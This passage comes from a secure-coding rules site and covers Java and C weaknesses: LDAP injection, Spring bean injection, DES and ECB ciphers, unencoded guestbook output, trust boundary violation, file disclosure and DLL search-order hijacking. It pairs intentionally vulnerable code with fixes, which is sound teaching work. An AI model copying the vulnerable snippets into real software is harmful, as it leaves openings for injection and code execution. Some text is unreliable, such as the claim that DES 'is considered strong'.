      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a whitelist to sanitize user input so that the filter string contains only valid characters. In this code, userSN may contain only letters and spaces, whereas a password may contain only alphanumeric characters:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS54-J.+Prevent+LDAP+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1108">Spring Beans Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Developers can load Spring Bean definitions from different resources like files and URLs. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers are able to control the contents of Bean resources and therefore may run arbitrary code, if untrusted user inputs are not validated properly.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7541">DES is insecure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>DES is insecure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
DES is considered strong ciphers for modern applications. Currently, NIST recommends the
usage of AES block ciphers instead of DES.
</p>
<p>
<b>Example weak code:</b>
<pre>Cipher c = Cipher.getInstance("DES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
<b>Example solution:</b>
<pre>Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://www.nist.gov/itl/fips/060205_des.cfm">NIST Withdraws Outdated Data Encryption Standard</a><br/>
<a href="http://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1089">Insecure Sanitizer Policy</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as "&lt;", "&gt;", and "&amp;" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed.</p>
</li>
<li>
<p>Use and specify an output encoding that can be handled by the downstream component that is reading the output.</p>
</li>
<li>
<p>With Struts, write all data from form beans with the bean's filter attribute set to true.</p>
</li>
<li>
<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>In the following example, a guestbook comment isn't properly encoded, filtered, or otherwise neutralized for script-related tags before being displayed in a client browser.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">&lt;%</span> <span class="k">for</span> <span class="o">(</span><span class="n">Iterator</span> <span class="n">i</span> <span class="o">=</span> <span class="n">guestbook</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span> <span class="n">i</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();</span> <span class="o">)</span> <span class="o">{</span>
<span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">)</span> <span class="n">i</span><span class="o">.</span><span class="na">next</span><span class="o">();</span> <span class="k">%&gt;</span>
<span class="nt">&lt;p&gt;</span>Entry #<span class="k">&lt;%=</span> <span class="n">e</span><span class="o">.</span><span class="na">getId</span><span class="o">()</span> <span class="k">%&gt;</span><span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span><span class="k">&lt;%=</span> <span class="n">e</span><span class="o">.</span><span class="na">getText</span><span class="o">()</span> <span class="k">%&gt;</span><span class="nt">&lt;/p&gt;</span>
<span class="k">&lt;%</span>
<span class="o">}</span> <span class="k">%&gt;</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/80.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7563">ECB mode is insecure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>ECB mode is insecure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>An authentication cipher mode which provides better confidentiality of the encrypted data should be used instead of Electronic Codebook (ECB) mode, 
which does not provide good confidentiality. Specifically, ECB mode produces the same output for the same input each time. So, 
for example, if a user is sending a password, the encrypted value is the same each time. This allows an attacker to intercept 
and replay the data.</p>
<p>
To fix this, something like Galois/Counter Mode (GCM) should be used instead.
</p>
<p>
<b>Code at risk:</b>
<pre>Cipher c = Cipher.getInstance("AES/ECB/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
<b>Solution:</b>
<pre>Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://en.wikipedia.org/wiki/Authenticated_encryption">Wikipedia: Authenticated encryption</a><br/>
<a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01">NIST: Authenticated Encryption Modes</a><br/>
<a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Electronic_codebook_.28ECB.29">Wikipedia: Block cipher modes of operation</a><br/>
<a href="http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf">NIST: Recommendation for Block Cipher Modes of Operation</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7584">Trust Boundary Violation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Trust Boundary Violation</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    "A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted.
    On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data
    to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a
    program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the
    same data structure, it becomes easier for programmers to mistakenly trust unvalidated data." <sup>[1]</sup>
</p></p>
<p>
<b>Code at risk:</b><br/>
<pre>
public void doSomething(HttpServletRequest req, String activateProperty) {
    //..
    req.getSession().setAttribute(activateProperty,"true");
}</pre>
<pre>
public void loginEvent(HttpServletRequest req, String userSubmitted) {
    //..
    req.getSession().setAttribute("user",userSubmitted);
}
</pre>
</p>
<p>
<b>Solution:</b><br/>
<p>
The solution would be to add validation prior setting a new session attribute. When possible, prefer data from
safe location rather than using direct user input.
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="references">References</h1>
<p>[1] <a href="https://cwe.mitre.org/data/definitions/501.html">CWE-501: Trust Boundary Violation</a><br/>
<a href="https://www.owasp.org/index.php/Trust_Boundary_Violation">OWASP : Trust Boundary Violation</a></p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1101">File Disclosure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Files or directories are accessible in the environment that should not be.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>If some sensitive file is accessible to attackers, they may follow them along and find out more opportunities of other types of attack.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
<li>
<p>Understand all the potential areas where untrusted inputs can enter your software.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following code doesn't validate untrusted user input to build a path for forwarding:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">&lt;%</span> <span class="n">String</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"retUrl"</span><span class="o">);</span> <span class="k">%&gt;</span>
<span class="k">&lt;jsp:include page="&lt;%ret%&gt;</span>;" /&gt;
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/552.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0089">Process Control</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code Example 3</a></li>
<li><a href="#fixed-code-example-3">Fixed code Example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Process control vulnerabilities take two forms: </p>
<ol>
<li>An attacker can change the command that the program executes: the attacker explicitly controls what the command is. </li>
<li>An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. </li>
</ol>
<p>Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.  </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Execute Unauthorized Code or Commands</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system.</p>
<h3 id="fixed-code-example-1">Fixed code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="c1">// Use absolute path</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"C:\\path_to_real_lib\\library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">...</span>
<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hkey</span><span class="p">,</span> <span class="s">"APPHOME"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">home</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">lib</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">home</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">INITLIB</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">lib</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">home</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">INITCMD</span><span class="p">);</span>
  <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">lib</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
</pre></div>
</td></tr></table>
<p>The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code.</p>
<h3 id="fixed-code-example-2">Fixed code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">...</span>

<span class="c1">// Ensure the safety of data before updating Reg</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_safe_key</span><span class="p">(</span><span class="n">hkey</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_safe</span><span class="p">(</span><span class="n">home</span><span class="p">))</span> <span class="p">{</span>
 <span class="n">error_handle</span><span class="p">(</span><span class="s">"Unsafe Reg editing"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hkey</span><span class="p">,</span> <span class="s">"APPHOME"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">home</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">lib</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">home</span><span class="p">)</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">INITLIB</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">lib</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">home</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">INITCMD</span><span class="p">);</span>
  <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">lib</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-3">Vulnerable code Example 3</h3>
<p>The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"liberty.dll"</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</p>
<h3 id="fixed-code-example-3">Fixed code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Use absolute path</span>
<span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">path_to_real_lib</span><span class="se">\\</span><span class="s">liberty.dll"</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/114.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-114.html">CWE-114</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
